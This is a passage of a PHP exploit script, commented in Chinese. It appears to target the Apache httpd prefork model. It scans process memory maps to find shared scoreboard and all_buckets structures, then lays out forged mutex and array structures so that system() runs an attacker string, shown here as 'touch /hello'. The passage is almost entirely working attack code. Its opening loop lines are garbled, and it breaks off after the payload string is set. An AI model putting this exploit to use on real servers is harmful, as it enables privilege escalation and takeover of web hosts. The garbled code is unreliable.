        for($j = 0;$j>($j*8)));
            write_mem($addr+$j,$b);
        }
    }
    function write_mem_dword($addr,$data)
    {
        for($j=0;$j>($j*8)));
            write_mem($addr+$j,$b);
        }
    }
    function write_mem_byte($addr,$data)
    {
        write_mem($addr,$data);
    }
    /*
    get_mem_region:
    str为，maps文件中的特征字符串,用于搜索指定的内存区域
    返回值为:
    array(2) {
        [0]=>//第一个匹配的内存区域
        array(2) {
                [0]=>
                int(140231115968512)//起始地址
                [1]=>
            int(140231116066816)//结束地址
                [2]=>
            string(4) "rw-s"//保护权限
        }
        [1]=>//第二个匹配的内存区域
        array(2) {
            [0]=>
            int(140231116201984)
            [1]=>
            int(140231116718080)
                [2]=>
            string(4) "rw-s"//保护权限
        }
    }
    */
    function get_mem_region($str)
    {
        $file = fopen("/proc/self/maps","r");
        $result_index = 0;
        $result = array();
        while(!feof($file)){
            $line = fgets($file);
            if(strpos($line,$str)){
                $addr_len = 0;
                for(;$line[$addr_len]!='-';$addr_len++);
                $start_addr_str =  substr($line,0,$addr_len);
                $end_addr_str = substr($line,$addr_len+1,$addr_len);
                $result[$result_index][0] = hexdec($start_addr_str);
                $result[$result_index][1] = hexdec($end_addr_str);
                $result[$result_index][2] = substr($line,$addr_len*2+2,4);
                $result_index++;
            }
        }
        fclose($file);
        return $result;
    }
    function locate_parent_arr_addr()//获取共享内存中，parent数组的首地址
    {
        $my_pid = getmypid();
        $shm_region = get_mem_region("/dev/zero");
        if(!count($shm_region))
            return 0;
        //parent数组项的大小是，每个0x20个字节
        //pid_t在我环境中，大小4字节
        $pid_t_size = 4;
        $parent_size = 0x24;
        //只检查共享内存的前0x1000字节(4KB)
        for($i = 0;$i<0x1000;$i++){
            $hit_count = 0;
            for($j = 0;$j<5;$j++){//循环次数，请参考httpd-mpm.conf中的prefork的MinSpareServers
                $pid = read_mem_dword($shm_region[0][0]+ $i + $j*$parent_size);
                if( $my_pid - 20 < $pid && $pid < $my_pid+20){//因为prefork中，进程的pid是紧挨的，我们可以通过这个来判断是否是parent数组的首地址
                    $hit_count++;    
                }
            }
            if($hit_count == 5){
                return $shm_region[0][0]+$i;
            }
        }
        return 0;
    }
    function locate_self_parent_struct_addr()//获取共享内存中，当前parent的首地址
    {
        $my_pid = getmypid();
        $shm_region = get_mem_region("/dev/zero");
        if(!count($shm_region))
            return 0;
        //因为parent数组，总是位于第一个/dev/zero中，所以，我们只搜索第一个
        echo "/dev/zero start addr:0x".dechex($shm_region[0][0])."\n";
        echo "/dev/zero end addr:0x".dechex($shm_region[0][1])."\n";
        for($i =0;$i<4096;$i++){
            $pid = read_mem_dword($shm_region[0][0]+$i);//pid_t在我的环境中，为4字节大小
            if($pid == $my_pid){
                return $shm_region[0][0]+$i;//找到直接返回
            }
        }
        return 0;
    }
    //获取all_buckets的地址
    function locate_all_buckets_addr()
    {
        $heap_region = get_mem_region("heap");//在我的环境中，all_bucket位于第一个heap中
        $libapr_region = get_mem_region("libapr-");
        if(!count($heap_region) || !count($libapr_region))
            return 0;
        $heap_start_addr = $heap_region[0][0];
        $heap_end_addr = $heap_region[0][1];
        echo "heap start addr:0x".dechex($heap_start_addr)."\n";
        echo "heap end addr:0x".dechex($heap_end_addr)."\n";
        $libapr_text_start_addr = 0;
        $libapr_data_start_addr = 0;
        $libapr_text_end_addr = 0;
        $libapr_data_end_addr = 0;
        for($i = 0;$i<count($libapr_region);$i++){
            if($libapr_region[$i][2] === "r-xp"){//代码段
                $libapr_text_start_addr = $libapr_region[$i][0];
                $libapr_text_end_addr = $libapr_region[$i][1];
                continue;
            }
            if($libapr_region[$i][2] === "r--p"){//const data
                $libapr_data_start_addr = $libapr_region[$i][0];
                $libapr_data_end_addr = $libapr_region[$i][1];
                continue;
            }
        }
        echo "libapr text start addr:0x".dechex($libapr_text_start_addr)."\n";
        echo "libapr text end addr:0x".dechex($libapr_text_end_addr)."\n";
        echo "libapr data start addr:0x".dechex($libapr_data_start_addr)."\n";
        echo "libapr data end addr:0x".dechex($libapr_data_end_addr)."\n";
        $result = array();
        $result_index = 0;
        for($i = 0;$i<$heap_end_addr - $heap_start_addr;$i+=8){//遍历heap
            $mutex_addr = read_mem_qword($heap_start_addr + $i);//prefork_child_bucket中的mutex
            if( $heap_start_addr <$mutex_addr && $mutex_addr<$heap_end_addr ){
                $meth_addr = read_mem_qword($mutex_addr + 8);//apr_proc_mutex_t中的meth
                if( $libapr_data_start_addr < $meth_addr && $meth_addr < $libapr_data_end_addr){
                    $function_point = read_mem_qword($meth_addr+8);
                    if($libapr_text_start_addr < $function_point && $function_point < $libapr_text_end_addr){
                        $result[$result_index++] = $heap_start_addr + $i - 8 -8;
                    }
                }
            }
        }
        //在我的环境中，有多个地址满足是all_buckets 地址的要求，但是只有第3个才是正确的
        if( count($result)!= 4 ){
            return 0;
        }
        else{
            return $result[2];
        }
    }
    echo "PID: ".getmypid()."\n";
    $parent_struct_addr = locate_self_parent_struct_addr();
    if($parent_struct_addr == 0){
        die("get self parent struct addr error\n");
    }
    echo "self parent struct addr:0x".dechex($parent_struct_addr)."\n";
    $parent_arr_addr = locate_parent_arr_addr();
    if($parent_arr_addr){
        echo "parent arr addr:0x".dechex($parent_arr_addr)."\n";
    }
    $all_buckets_addr = locate_all_buckets_addr();
    if($all_buckets_addr == 0){
        die("get all_buckets addr error\n");
    }
    echo "all_buckets addr:0x".dechex($all_buckets_addr)."\n";
    $evil_parent_start_addr = $parent_arr_addr + 0x24 * 10;//(我这里的parent 就是 prefork_child_bucket结构，0x24是每个prefork_child_bucket的大小，10参考http-mpm.conf中prefork的MaxSpareServers)
    echo "evil prefork_child_bucket start addr:0x".dechex($evil_parent_start_addr)."\n";
    //我们需要将prefork_child_bucket与zend_object结合，使其包含zend_object 的 properties字段,因此prefork_child_bucket的"大小"是40+16字节
    $evil_parent_end_addr = $evil_parent_start_addr + 40+16;
    echo "evil prefork_child_bucket end addr:0x".dechex($evil_parent_end_addr)."\n";
    //将apr_proc_mutex_t结构与zend_array结构结合为一个结构
    $evil_zend_array_start_addr = $evil_parent_end_addr;
    echo "evil zend_array start addr:0x".dechex($evil_zend_array_start_addr)."\n";
    $evil_zend_array_end_addr = $evil_zend_array_start_addr + 0x38;
    echo "evil zend_array end addr:0x".dechex($evil_zend_array_end_addr)."\n";
    //apr_proc_mutex_unix_lock_methods_t结构
    $evil_mutex_methods_start_addr = $evil_zend_array_end_addr;
    $evil_mutex_methods_end_addr = $evil_mutex_methods_start_addr + 0x50;
    echo "evil mutex_methods start addr:0x".dechex($evil_mutex_methods_start_addr)."\n";
    echo "evil mutex_methods end addr:0x".dechex($evil_mutex_methods_end_addr)."\n";
    //system()中的字符串
    $evil_string = "touch /hello";